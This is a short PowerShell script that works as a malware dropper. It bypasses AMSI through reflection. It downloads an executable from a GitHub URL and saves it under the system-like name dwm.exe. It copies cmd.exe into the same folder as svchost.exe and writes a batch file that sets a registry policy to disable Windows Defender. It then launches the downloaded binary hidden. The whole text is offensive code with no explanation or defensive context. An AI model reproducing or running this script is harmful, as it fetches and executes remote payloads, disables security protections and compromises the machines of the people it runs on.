[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$t="$env:APPDATA\Microsoft\Windows\Themes"
$m="$t\dwm.exe"
$c="$t\svchost.exe"

New-Item -ItemType Directory -Path $t -Force | Out-Null

$wc=New-Object Net.WebClient
$wc.DownloadFile('https://github.com/taxesmmmm-collab/tsetinyourmymmas-ass/raw/main/method34.exe', $m)
Copy-Item "$env:SystemRoot\System32\cmd.exe" $c -Force

$b="$t\run.bat"
@"
@echo off
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
timeout /t 3 /nobreak >nul
"@ | Out-File $b -Encoding ASCII

Start-Process $m -ArgumentList "`"$c /c $b`"" -WindowStyle Hidden